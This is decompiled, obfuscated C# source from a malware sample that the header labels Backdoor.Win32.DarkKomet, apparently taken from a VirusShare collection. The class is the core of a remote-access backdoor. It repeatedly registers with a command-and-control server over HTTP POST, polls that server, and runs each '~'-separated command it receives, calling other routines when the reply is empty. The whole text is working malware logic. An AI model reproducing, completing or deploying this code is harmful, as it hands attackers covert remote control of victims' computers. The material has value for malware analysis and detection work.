// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using System.IO;
using System.Net;
using System.Text;
using System.Threading;

internal sealed class \u0003\u2001 : \u0006\u2000
{
  public static \u0005\u2000 \u0002 = new \u0005\u2000();

  public void \u0002()
  {
    this.\u0003();
    new Thread(new ThreadStart(this.\u0005)).Start();
  }

  public void \u0002(int _param1) => this.\u0002(\u0005\u2001.\u0002.\u000F\u2002, \u0006\u2002.\u0002(-885877111) + \u0005\u2001.\u0002.\u0005\u2003.ToString() + \u0006\u2002.\u0002(-885876998) + (object) _param1);

  public void \u0002(string _param1, string _param2) => this.\u0002(\u0005\u2001.\u0002.\u000F\u2002, \u0006\u2002.\u0002(-885877012) + _param1 + \u0006\u2002.\u0002(-885877028) + _param2 + \u0006\u2002.\u0002(-885877034) + \u0003\u2001.\u0002.\u0006\u2003.ToString());

  public new void \u0002(string _param1) => this.\u0002(\u0005\u2001.\u0002.\u000F\u2002, \u0006\u2002.\u0002(-885877045) + \u0003\u2001.\u0002.\u0006\u2003.ToString() + \u0006\u2002.\u0002(-885880518) + _param1.ToString());

  private void \u0003()
  {
    string str = \u0006\u2002.\u0002(-885880529) + \u0005\u2001.\u0002.\u0005\u2003 + \u0006\u2002.\u0002(-885880552) + \u0005\u2001.\u0002.\u0006\u2003 + \u0006\u2002.\u0002(-885880567) + \u0005\u2001.\u0002.\u000E\u2002 + \u0006\u2002.\u0002(-885880455) + \u0005\u2001.\u0002.\u0008\u2003;
    while (true)
    {
      try
      {
        this.\u0002(\u0005\u2001.\u0002.\u000F\u2002, str);
        break;
      }
      catch
      {
      }
      Thread.Sleep(\u0005\u2001.\u0002.\u0002\u2003 * 1000);
    }
  }

  private void \u0005()
  {
    string str1 = \u0006\u2002.\u0002(-885880462) + \u0005\u2001.\u0002.\u0005\u2003;
    while (true)
    {
      try
      {
        string str2 = this.\u0002(\u0005\u2001.\u0002.\u000F\u2002, str1);
        if (str2.Length > 0)
        {
          int num = 0;
          try
          {
            foreach (char ch in str2)
            {
              if (ch.ToString() == \u0006\u2002.\u0002(-885875988))
                ++num;
            }
          }
          catch
          {
          }
          for (int index = 0; index < num; ++index)
          {
            try
            {
              base.\u0002(str2.Split('~')[index].Replace(\u0006\u2002.\u0002(-885875988), string.Empty));
            }
            catch
            {
            }
          }
        }
        else
        {
          try
          {
            \u0003.\u0003();
          }
          catch
          {
          }
          try
          {
            \u0008\u2000.\u0003();
          }
          catch
          {
          }
          try
          {
            \u0003\u2002.\u0003();
          }
          catch
          {
          }
          try
          {
            \u0008.\u0003();
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      Thread.Sleep(\u0005\u2001.\u0002.\u0002\u2003 * 1000);
    }
  }

  private string \u0002(string _param1, string _param2)
  {
    ServicePointManager.Expect100Continue = false;
    HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param1);
    httpWebRequest.ContentType = \u0006\u2002.\u0002(-885880481);
    httpWebRequest.Method = \u0006\u2002.\u0002(-885880393);
    httpWebRequest.UserAgent = \u0005\u2001.\u0002.\u0006\u2002;
    byte[] bytes = Encoding.Default.GetBytes(_param2);
    httpWebRequest.ContentLength = (long) bytes.Length;
    Stream requestStream = httpWebRequest.GetRequestStream();
    requestStream.Write(bytes, 0, bytes.Length);
    requestStream.Close();
    WebResponse response = httpWebRequest.GetResponse();
    return response == null ? string.Empty : new StreamReader(response.GetResponseStream()).ReadToEnd().Trim();
  }
}
